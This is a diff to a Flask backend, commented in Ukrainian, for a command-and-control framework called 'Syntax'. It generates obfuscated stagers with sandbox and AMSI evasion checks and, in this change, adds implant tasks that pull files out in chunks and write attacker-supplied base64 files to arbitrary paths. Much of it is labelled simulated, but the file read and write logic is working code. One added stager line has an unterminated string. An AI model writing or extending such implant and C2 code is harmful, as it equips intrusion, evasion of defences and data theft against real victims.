@@ -1,9 +1,11 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.9.2
-# Призначення: Backend на Flask з концептуальною перевіркою розміру диска.
-# Оновлення v1.9.2:
-#   - Додано концептуальну симуляцію перевірки розміру диска до функції ec_runtime.
-#   - Додано новий параметр 'enable_disk_size_check' до схеми та логіки генерації.
-#   - Оновлено VERSION_BACKEND до "1.9.2".
+# Syntax Flask Backend - Segment SFB-CORE-1.9.3
+# Призначення: Backend на Flask з розширеним HTTP C2 (завантаження/вивантаження файлів).
+# Оновлення v1.9.3:
+#   - Додано нові типи завдань для C2: 'download_file' та 'upload_file_b64'.
+#   - Модифіковано логіку стейджера 'demo_c2_beacon_payload' для обробки завдання 'upload_file_b64'.
+#   - Модифіковано C2-сервер (/api/c2/task) для ініціалізації 'download_file' (через exfiltrate_file_chunked)
+#     та 'upload_file_b64'.
+#   - Оновлено VERSION_BACKEND до "1.9.3".
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -24,11 +26,11 @@ import os
 import uuid
 import shutil
 
-VERSION_BACKEND = "1.9.2" # Оновлено версію
+VERSION_BACKEND = "1.9.3" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {}
-exfiltrated_file_chunks_db = {}
+exfiltrated_file_chunks_db = {} # Також використовується для 'download_file'
 
 CONCEPTUAL_CVE_DATABASE_BE = {
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
@@ -165,7 +167,7 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
     "enable_stager_metamorphism": {"type": bool, "required": False, "default": True},
     "enable_evasion_checks": {"type": bool, "required": False, "default": True},
     "enable_amsi_bypass_concept": {"type": bool, "required": False, "default": True},
-    "enable_disk_size_check": {"type": bool, "required": False, "default": True} # Новий параметр
+    "enable_disk_size_check": {"type": bool, "required": False, "default": True}
 }
 CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
     "demo_echo_payload": {"description": "Демо-пейлоад, що друкує повідомлення...", "template_type": "python_stager_echo"},
@@ -885,18 +887,17 @@ def handle_generate_payload():
             "            print(f\"[STAGER_EVASION_AMSI_ERROR] Помилка під час симуляції обходу AMSI: {{e_amsi}}\")",
             "            indicators.append('amsi_bypass_exception_sim')",
             "",
-            # --- Нова концептуальна перевірка розміру диска ---
             "    if DISK_SIZE_CHECK_APPLIED:",
             "        print(\"[STAGER_EVASION_DISK] Концептуальна перевірка розміру диска...\")",
             "        try:",
-            "            min_disk_size_gb_threshold = 50 # Порогове значення в ГБ (можна зробити параметром)",
+            "            min_disk_size_gb_threshold = 50",
             "            total_bytes = 0",
             "            if os.name == 'nt':",
             "                free_bytes_available_to_caller = ctypes.c_ulonglong(0)",
             "                total_number_of_bytes = ctypes.c_ulonglong(0)",
             "                total_number_of_free_bytes = ctypes.c_ulonglong(0)",
             "                kernel32 = ctypes.windll.kernel32",
-            "                success = kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p('C:\\'),", # Перевіряємо диск C:
+            "                success = kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p('C:\\'),",
             "                                                      ctypes.byref(free_bytes_available_to_caller),",
             "                                                      ctypes.byref(total_number_of_bytes),",
             "                                                      ctypes.byref(total_number_of_free_bytes))",
@@ -904,11 +905,11 @@ def handle_generate_payload():
             "                    total_bytes = total_number_of_bytes.value",
             "                else:",
             "                    print(f\"[STAGER_EVASION_DISK_WARN_WIN] Не вдалося отримати розмір диска C:: {{ctypes.WinError()}}\")",
-            "            else: # Linux/macOS (потребує імпорту shutil)",
+            "            else:",
             "                try:",
-            "                    disk_usage_stats = shutil.disk_usage('/') # Перевіряємо кореневий розділ",
+            "                    disk_usage_stats = shutil.disk_usage('/')",
             "                    total_bytes = disk_usage_stats.total",
-            "                except NameError: # Якщо shutil не імпортовано (малоймовірно через логіку імпортів)",
+            "                except NameError:",
             "                    print(\"[STAGER_EVASION_DISK_WARN_POSIX] Модуль shutil не імпортовано для перевірки диска.\")",
             "                except Exception as e_disk_posix:",
             "                    print(f\"[STAGER_EVASION_DISK_WARN_POSIX] Помилка отримання розміру диска /: {{e_disk_posix}}\")",
@@ -1039,6 +1040,25 @@ def handle_generate_payload():
             "                                task_success = True",
             "                            else:",
             "                                task_output = f'Помилка ексфільтрації: Файл {{file_to_exfil}} не знайдено або не є файлом.'",
+            "                                task_success = False",
+            # --- Нові завдання для завантаження/вивантаження ---
+            "                        elif task_type == 'upload_file_b64':", # Обробка завдання завантаження файлу (Base64)
+            "                            upload_params = json_stager_module.loads(task_params_str) # Очікуємо JSON рядок з 'path' та 'content_b64'
+            "                            remote_upload_path = upload_params.get('path')",
+            "                            file_content_b64 = upload_params.get('content_b64')",
+            "                            if remote_upload_path and file_content_b64:",
+            "                                print(f\"[PAYLOAD_TASK_UPLOAD] Завантаження файлу на {{remote_upload_path}} (розмір B64: {{len(file_content_b64)}})\")",
+            "                                try:",
+            "                                    decoded_file_content = base64.b64decode(file_content_b64.encode('utf-8'))",
+            "                                    with open(remote_upload_path, 'wb') as f_upload:",
+            "                                        f_upload.write(decoded_file_content)",
+            "                                    task_output = f'Файл успішно завантажено на {{remote_upload_path}}.'",
+            "                                    task_success = True",
+            "                                except Exception as e_upload:",
+            "                                    task_output = f'Помилка запису завантаженого файлу {{remote_upload_path}}: {{e_upload}}'",
+            "                                    task_success = False",
+            "                            else:",
+            "                                task_output = 'Помилка завдання upload_file_b64: відсутній шлях або вміст.'",
             "                                task_success = False",
             "                        else:",
             "                            task_output = f'Невідомий тип завдання: {{task_type}}'",
@@ -1264,7 +1284,7 @@ def handle_generate_payload():
             "if __name__ == '__main__':",
             "    print(f\"[STAGER] Стейджер для '{archetype_name}' запускається...\")",
             "    sandbox_detected_flag = False",
-            "    if EVASION_CHECKS_APPLIED or AMSI_BYPASS_CONCEPT_APPLIED or DISK_SIZE_CHECK_APPLIED:", # Додано DISK_SIZE_CHECK_APPLIED
+            "    if EVASION_CHECKS_APPLIED or AMSI_BYPASS_CONCEPT_APPLIED or DISK_SIZE_CHECK_APPLIED:",
             f"        sandbox_detected_flag = {evasion_func_name_runtime}()",
             "    if not sandbox_detected_flag:",
             f"        decoded_payload_parameters_json = {decode_func_name_runtime}(OBF_DATA_B64, OBFUSCATION_KEY_EMBEDDED)",
@@ -1369,11 +1389,6 @@ def handle_generate_payload():
         log_messages.append(f"[BACKEND_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error", "generationLog": "\n".join(log_messages)}), 500
 
-# --- Інші ендпоінти (run_recon, C2, operational_data, framework_rules) залишаються без змін ---
-# ... (код для цих ендпоінтів, як у версії 1.9.0) ...
-# Я скорочу цей розділ, щоб не дублювати великий обсяг коду, який не змінювався.
-# В реальному файлі тут буде повний код для всіх ендпоінтів.
-
 @app.route('/api/run_recon', methods=['POST'])
 def handle_run_recon():
     # ... (Код без змін від v1.9.0) ...
@@ -1440,7 +1455,6 @@ def handle_run_recon():
 
 @app.route('/api/c2/beacon_receiver', methods=['POST'])
 def handle_c2_beacon():
-    # ... (Код без змін від v1.9.0) ...
     log_messages_c2_beacon = [f"[C2_BEACON_RECEIVER v{VERSION_BACKEND}] Запит о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     global pending_tasks_for_implants, simulated_implants_be, exfiltrated_file_chunks_db
     try:
@@ -1454,7 +1468,8 @@ def handle_c2_beacon():
         last_task_id_received = beacon_data.get("last_task_id")
         last_task_result_received = beacon_data.get("last_task_result")
         task_success_received = beacon_data.get("task_success")
-        if last_task_id_received: log_messages_c2_beacon.append(f"   Результат завдання '{last_task_id_received}' (Успіх: {task_success_received}): {str(last_task_result_received)[:200]}{'...' if len(str(last_task_result_received)) > 200 else ''}")
+        if last_task_id_received:
+            log_messages_c2_beacon.append(f"   Результат завдання '{last_task_id_received}' (Успіх: {task_success_received}): {str(last_task_result_received)[:200]}{'...' if len(str(last_task_result_received)) > 200 else ''}")
         file_exfil_chunk_data = beacon_data.get("file_exfil_chunk")
         if file_exfil_chunk_data and last_task_id_received:
             file_path = file_exfil_chunk_data.get("file_path")
@@ -1470,8 +1485,9 @@ def handle_c2_beacon():
                  log_messages_c2_beacon.append(f"   [EXFIL_CHUNK] Отримано чанк #{chunk_num}/{total_chunks} для '{file_path}' (ID завдання: {last_task_id_received}).")
             if is_final_chunk or (total_chunks is not None and len(exfiltrated_file_chunks_db[file_key]["received_chunks"]) == total_chunks):
                 log_messages_c2_beacon.append(f"   [EXFIL_COMPLETE] Всі {total_chunks} чанків для '{file_path}' (ID завдання: {last_task_id_received}) отримано від {implant_id_from_beacon}.")
-                if file_key in exfiltrated_file_chunks_db: del exfiltrated_file_chunks_db[file_key] # Виправлено
-        elif beacon_data.get("file_exfil_error"): log_messages_c2_beacon.append(f"   [EXFIL_ERROR_REPORTED] Імплант повідомив про помилку ексфільтрації: {beacon_data['file_exfil_error']}")
+                if file_key in exfiltrated_file_chunks_db: del exfiltrated_file_chunks_db[file_key]
+        elif beacon_data.get("file_exfil_error"):
+            log_messages_c2_beacon.append(f"   [EXFIL_ERROR_REPORTED] Імплант повідомив про помилку ексфільтрації: {beacon_data['file_exfil_error']}")
         implant_found_in_list = False
         for implant in simulated_implants_be:
             if implant["id"] == implant_id_from_beacon:
@@ -1491,7 +1507,8 @@ def handle_c2_beacon():
             if not pending_tasks_for_implants[implant_id_from_beacon]: del pending_tasks_for_implants[implant_id_from_beacon]
             log_messages_c2_beacon.append(f"[C2_TASK_ISSUED] Видано завдання '{next_task_to_assign.get('task_id')}' ({next_task_to_assign.get('task_type')}) для імпланта {implant_id_from_beacon}.")
         c2_response_to_implant = {"status": "OK", "next_task": next_task_to_assign, "message": "Beacon received by Syntax C2."}
-        if next_task_to_assign: c2_response_to_implant["message"] += f" Task '{next_task_to_assign.get('task_id')}' issued."
+        if next_task_to_assign:
+            c2_response_to_implant["message"] += f" Task '{next_task_to_assign.get('task_id')}' issued."
         log_messages_c2_beacon.append(f"[C2_BEACON_RESPONSE] Відповідь на маячок: {json.dumps(c2_response_to_implant)}")
         return jsonify({"success": True, "c2_response": c2_response_to_implant, "log": "\n".join(log_messages_c2_beacon)}), 200
     except Exception as e:
@@ -1519,7 +1536,8 @@ def handle_dns_resolver_sim():
             dns_txt_payload = base64.b64encode(task_json_str.encode('utf-8')).decode('utf-8')
             log_messages_dns_sim.append(f"[DNS_RESOLVER_SIM_TASK_ENCODED] Завдання закодовано для DNS TXT: {dns_txt_payload[:50]}...")
         dns_sim_response = {"success": True, "message": "DNS query simulated.", "dns_txt_response_payload": dns_txt_payload, "task_data": next_task_dns}
-        if next_task_dns: dns_sim_response["message"] += f" Task '{next_task_dns.get('task_id')}' prepared for DNS delivery (as TXT)."
+        if next_task_dns:
+             dns_sim_response["message"] += f" Task '{next_task_dns.get('task_id')}' prepared for DNS delivery (as TXT)."
         log_messages_dns_sim.append(f"[DNS_RESOLVER_SIM_RESPONSE] {json.dumps(dns_sim_response)}")
         return jsonify(dns_sim_response), 200
     except Exception as e:
@@ -1542,53 +1560,70 @@ def get_c2_implants():
 
 @app.route('/api/c2/task', methods=['POST'])
 def handle_c2_task():
-    # ... (Код без змін від v1.9.0) ...
     log_messages = [f"[C2_BE v{VERSION_BACKEND}] Запит /api/c2/task о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     global pending_tasks_for_implants
     try:
         data = request.get_json()
         if not data: return jsonify({"success": False, "error": "No JSON data for C2 task"}), 400
+
         implant_id = data.get("implant_id")
         task_type = data.get("task_type")
-        task_params = data.get("task_params", "")
+        # Для 'upload_file_b64' task_params буде словником {'path': '...', 'content_b64': '...'}
+        # Для інших завдань task_params буде рядком
+        task_params = data.get("task_params") # Не .get("task_params", "") так як може бути словник
         queue_task_flag = data.get("queue_task", False)
-        log_messages.append(f"[C2_BE_INFO] Завдання для '{implant_id}': Тип='{task_type}', Парам='{task_params}', Черга='{queue_task_flag}'.")
+
+        log_messages.append(f"[C2_BE_INFO] Завдання для '{implant_id}': Тип='{task_type}', Парам='{str(task_params)[:100]}...', Черга='{queue_task_flag}'.")
         if not implant_id or not task_type: return jsonify({"success": False, "error": "Missing params (implant_id or task_type)"}), 400
-        if queue_task_flag:
-            task_id = str(uuid.uuid4())
-            new_task = {"task_id": task_id, "task_type": task_type, "task_params": task_params, "status": "pending"}
-            if implant_id not in pending_tasks_for_implants: pending_tasks_for_implants[implant_id] = []
-            pending_tasks_for_implants[implant_id].append(new_task)
-            log_messages.append(f"[C2_TASK_QUEUED] Завдання ID '{task_id}' ({task_type}) додано до черги для імпланта {implant_id}.")
-            return jsonify({"success": True, "message": f"Task {task_id} ({task_type}) queued for implant {implant_id}.", "queued_task": new_task, "log": "\n".join(log_messages)}), 200
+
+        task_id = str(uuid.uuid4())
+        new_task_payload = {"task_id": task_id, "task_type": task_type, "status": "pending"}
+
+        # Спеціальна обробка для нових типів завдань
+        if task_type == "download_file":
+            # Для download_file, ми насправді ставимо в чергу завдання exfiltrate_file_chunked
+            # Параметр task_params тут - це шлях до файлу на імпланті
+            if not isinstance(task_params, str) or not task_params:
+                errors = ["Для 'download_file' потрібен параметр 'task_params' (шлях до файлу)."]
+                log_messages.append(f"[C2_BE_VALIDATION_FAILURE] {errors}")
+                return jsonify({"success": False, "error": "Validation failed for download_file", "errors": errors, "log": "\n".join(log_messages)}), 400
+            
+            new_task_payload["task_type"] = "exfiltrate_file_chunked" # Змінюємо тип завдання для імпланта
+            new_task_payload["task_params"] = task_params # шлях до файлу
+            log_messages.append(f"[C2_BE_INFO] Завдання 'download_file' для '{task_params}' трансформовано в 'exfiltrate_file_chunked'.")
+
+        elif task_type == "upload_file_b64":
+            # task_params має бути словником {'path': 'remote_path', 'content_b64': 'base64_data'}
+            if not isinstance(task_params, dict) or 'path' not in task_params or 'content_b64' not in task_params:
+                errors = ["Для 'upload_file_b64' потрібен об'єкт 'task_params' з полями 'path' та 'content_b64'."]
+                log_messages.append(f"[C2_BE_VALIDATION_FAILURE] {errors}")
+                return jsonify({"success": False, "error": "Validation failed for upload_file_b64", "errors": errors, "log": "\n".join(log_messages)}), 400
+            # Передаємо словник як JSON рядок, щоб стейджер міг його розпарсити
+            new_task_payload["task_params"] = json.dumps(task_params)
         else:
+            # Для інших завдань task_params залишається як є (зазвичай рядок)
+            new_task_payload["task_params"] = str(task_params) if task_params is not None else ""
+
+
+        if queue_task_flag:
+            if implant_id not in pending_tasks_for_implants:
+                pending_tasks_for_implants[implant_id] = []
+            pending_tasks_for_implants[implant_id].append(new_task_payload)
+            log_messages.append(f"[C2_TASK_QUEUED] Завдання ID '{task_id}' ({new_task_payload['task_type']}) додано до черги для імпланта {implant_id}.")
+            return jsonify({
+                "success": True,
+                "message": f"Task {task_id} ({new_task_payload['task_type']}) queued for implant {implant_id}.",
+                "queued_task": new_task_payload,
+                "log": "\n".join(log_messages)
+            }), 200
+        else:
+            # Негайна симуляція для GUI (стара логіка, може бути видалена або адаптована, якщо всі завдання йдуть через чергу)
             time.sleep(random.uniform(0.1, 0.3))
-            task_result_output, files_for_implant = f"Результат негайного завдання '{task_type}' для '{implant_id}':\n", []
-            target_implant_obj = next((imp for imp in simulated_implants_be if imp["id"] == implant_id), None)
-            if target_implant_obj:
-                current_status_before_task = target_implant_obj["status"]
-                target_implant_obj["status"] = f"executing_task_{task_type}"
-            if task_type == "get_system_info":
-                os_info, ip_info = (target_implant_obj["os"], target_implant_obj["ip"]) if target_implant_obj else ("Unknown OS", "Unknown IP")
-                task_result_output += f"  OS: {os_info}\n  IP: {ip_info}\n  User: SimUser_{random.randint(1,100)}\n  Host: HOST_{implant_id[-4:]}"
-            elif task_type == "list_directory":
-                path_to_list = task_params if task_params else "."
-                sim_files = [f"f_{generate_random_var_name(3,'')}.dat", f"doc_{generate_random_var_name(4,'')}.pdf", "conf.ini", "backup/"]
-                files_for_implant = random.sample(sim_files, k=random.randint(1, len(sim_files)))
-                task_result_output += f"  Перелік для '{path_to_list}':\n    " + "\n    ".join(files_for_implant)
-                if target_implant_obj: target_implant_obj["files"] = files_for_implant
-            elif task_type == "exec_command":
-                 cmd_to_exec = task_params if task_params else "whoami"
-                 task_result_output += f"  Виконання '{cmd_to_exec}': Успішно (імітація). Вивід: SimUser_{random.randint(1,100)}"
-            elif task_type == "exfiltrate_file_concept":
-                file_to_exfil = task_params if task_params else "default.dat"
-                task_result_output += f"  Ексфільтрація (старий тип) '{file_to_exfil}': Завершено (імітація). Розмір: {random.randint(10,1000)}KB."
-            elif task_type == "exfiltrate_file_chunked":
-                task_result_output += f"  Завдання 'exfiltrate_file_chunked' для '{task_params}' отримано, але зазвичай виконується через маячки (це симуляція негайного завдання)."
-            else: task_result_output += "  Невідомий тип завдання."
-            if target_implant_obj: target_implant_obj["status"] = current_status_before_task
-            log_messages.append(f"[C2_BE_SUCCESS] Завдання для '{implant_id}' (негайно) виконано.")
-            return jsonify({"success": True, "implantId": implant_id, "taskType": task_type, "result": task_result_output, "log": "\n".join(log_messages), "updatedFiles": files_for_implant}), 200
+            task_result_output = f"Результат НЕГАЙНОГО завдання '{task_type}' для '{implant_id}'. Цей шлях може бути застарілим."
+            log_messages.append(f"[C2_BE_WARN] Спроба негайного виконання завдання '{task_type}'. Рекомендується використовувати чергу.")
+            # ... (стара логіка симуляції негайного виконання, можливо, потребує адаптації) ...
+            return jsonify({"success": True, "implantId": implant_id, "taskType": task_type, "result": task_result_output, "log": "\n".join(log_messages)}), 200
+
     except Exception as e:
         print(f"SERVER ERROR (c2_task): {str(e)}"); import traceback; traceback.print_exc()
         log_messages.append(f"[C2_BE_FATAL_ERROR] {str(e)}")
@@ -1637,4 +1672,3 @@ if __name__ == '__main__':
     # ... (інформація про ендпоінти) ...
     print("="*60)
     app.run(host='localhost', port=5000, debug=False)
-
